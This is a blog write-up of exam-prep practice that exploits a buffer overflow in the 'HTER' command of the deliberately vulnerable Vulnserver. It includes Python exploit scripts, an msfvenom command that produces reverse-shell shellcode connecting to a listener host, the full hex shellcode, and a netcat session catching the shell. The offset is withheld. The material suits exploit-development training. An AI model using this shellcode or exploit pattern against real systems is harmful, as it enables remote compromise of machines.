---
layout: single
title: CTP/OSCE Prep -- 'HTER' EIP Overwrite with a Twist
date: 2019-6-04
classes: wide
header:
  teaser: /assets/images/CTP/immunity.jpg
tags:
  - buffer overflow
  - Windows
  - x86
  - shellcoding
  - exploit development
  - assembly
  - python
  - OSCE
  - CTP
--- 
![](/assets/images/CTP/1920x1080_Wallpaper.jpg)

## Introduction

This series of posts will focus on the concepts I'm learning/practicing in preparation for [CTP/OSCE](https://www.offensive-security.com/information-security-training/cracking-the-perimeter/). In this series of posts, I plan on exploring:
+ fuzzing,
+ vanilla EIP overwrite,
+ SEH overwrite, and
+ egghunters.

Writing these entries will force me to become intimately familiar with these topics, and hopefully you can get something out of them as well! 

This particular post is about exploiting the 'HTER' command on Vulnserver. 

## Fuzzing

Long story short here, Boofuzz was giving me all kinds of different payloads which were all crashing the application but none of them were consistent. The only thing I picked up from the fuzzing payloads was:
1. Our application is vulnerable to a buffer overflow
2. All the payloads were prepended with: `"HTER "`

So I started to manually fuzz the application with just our skeleton exploit python script we've been using starting with a payload of: `'A' * 1000` and working my way up. 

The application started to crash when I got to `'A' * 3000`
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

buffer = 'A' * 3000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("HTER " + buffer)
print s.recv(1024)
s.close()
```
Then I saw **this** in EIP. 

![](/assets/images/CTP/wtfEIP.JPG)

## EIP, wyd? 

So with 8 `A` values in `EIP` something is not normal here. Two possibilities come to mind: 
1. Our 32 bit registers can now hold 8 bytes via *magic*
2. The characters are not being interpreted/stored as ASCII, but maybe Hex? 

I'm going with option two here and testing it to see if we're right. (*Psst. I actually didn't even notice the 8 `A` until I found the offset and stuffed it with 8 `B`, but let's pretend I'm ontop of this stuff.*)

### Finding an Offset

Since we are guessing these chars are being interpreted as raw hex and not ASCII, mona is out for pattern create and pattern offset. What I did was cut my 3000 char buffer in half and made it 1500 `A` and 1500 `B` and repeated with similar techniques until I found the correct offset and was able to have my payload include only 8 `B` and all 8 ended up in `EIP`. 

![](/assets/images/CTP/8beip.png)

Since this was a more manual and creative way to find the offset, I'll leave that excercise to you and won't spoil it!

### Finding a JMP ESP

When we overflow the buffer, we see that we control `EIP` and `ESP` so basically we have everything we need to get a fully working exploit out of this, we just need a reliable way of jumping to `ESP` where we will put some NOPs and our shellcode. 

`!mona jmp -r esp` nets us the following `JMP ESP` addresses to choose from: 

![](/assets/images/CTP/hterJMP.JPG)

I went with the address at `0x625011BB`, but since our application is interpreting input as hex, we have to format it as `BB115062` in our payload since we also have to remember to format it for Little Endian. So, 1. reverse order and 2. no `\x` needed. 

Our payload now looks like this: 
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

buffer = 'A' * <offset number :)>
buffer += 'BB115062'
buffer += 'C' * (3000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("HTER " + buffer)
print s.recv(1024)
s.close()
```

## Shellcode and Endgame

Next we just have to generate some shellcode and add our NOPs and we should be good to go. But first, let's test and make sure our exploit worked. A cool thing about the program interpreting our characters as hex is that our `C` buffer will be interpreted as pairs of `CC` which is the opcode for `INT3` which will effectively become a breakpoint for us since it's an interrupt. Pretty cool way to see if our `JMP ESP` worked as intended. If it did, we should see `EIP` pointing to the top of a stack of `INT3` opcodes. 

![](/assets/images/CTP/INT3.JPG)

Everything looks good!

Let's generate some shellcode with the following command (notice we used the `-f hex` option): `msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.206 lport=443 -f hex EXITFUNC=thread -b "\x00"`

All we need to do now is add some NOPs to prepend our shellcode, they will simply be input into our script as `90` since we're dealing in hex. 

### Final Exploit Code Minus Offset ;)

```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

shellcode = ("ddc5bafbebb770d97424f45e2bc9b15283eefc31561303adf85585ad171b664de87ce"
"ea8d9bc94b94a0ddeef66e6b21bfc8a1a2cb5217d034619bd02c46092e4f5aae7e532d60ab7eb9cb92"
"79fe901ccd3fc0131a3ff20e4bf59e30713d2aa1f70df659442ab777c9b54db4113a72586945850fee"
"6e563c59531e1dd3eb15139be1607caccd34394d0e280afed6f277f642b0c5b2cef2dfa885e511c733"
"ef7579e2b8a3af798a7c407b7b0b735186b5f76d1b59879c8023684f3721f43a7223762c8a8c78b1d7"
"e9723ce3f4784bed78d0be0c8aec18963558275db549c1e1e56216497b04b8afe6be4335be795bc718"
"29637767358b0f3670d304ed5984f647146dde38101febbd64630b2b27a6b6ca086ed57605dce56691"
"06a7d79ec73392da025979b069c5975d1733011a4bf8367a99575871840c0b89504c4c1cbb42b1848d"
"4c988a57d545904e067b44b1de43c34daf43531a6b2a64bb756c8f8b872")

buffer = 'A' * <offset number>
buffer += 'BB115062'
buffer += '90' * 16 
buffer += shellcode
buffer += 'C' * (3000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("HTER " + buffer)
print s.recv(1024)
s.close()
```

And we catch our reverse shell!
```terminal_session
astrid:~/ # nc -lvp 443                                                                                           
listening on [any] 443 ...
192.168.1.201: inverse host lookup failed: Unknown host
connect to [192.168.1.206] from (UNKNOWN) [192.168.1.201] 49314
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 ' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\IEUser\Desktop>
```

## Conclusion

All in all, a pretty easy exploit compared to the things we've been doing but little curveballs like the hex characters can really stop progress for a while. It took me a while to figure out what was going on as I had never encountered this before and my go-to's like Mona weren't helping. Thanks for reading!

## Resources

+ [Do Buffer Overflow Good](https://github.com/justinsteven/dostackbufferoverflowgood)
+ [Finding Bad Characters](https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/)
+ [Intro to Boofuzz](https://zeroaptitude.com/zerodetail/fuzzing-with-boofuzz/)
+ [Vulnserver EIP Overwrite](https://captmeelo.com/exploitdev/osceprep/2018/06/27/vulnserver-trun.html)
+ [Vulnserver LTER EIP Overwrite](https://www.doyler.net/security-not-included/vulnserver-lter-eip-overwrite)
+ [Mona Guide](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)
+ [Immunity Debugger Basics](https://hsploit.com/immunity-debugger-basics/)
+ [Wallpaper](https://imgur.com/0S9DVnQ)
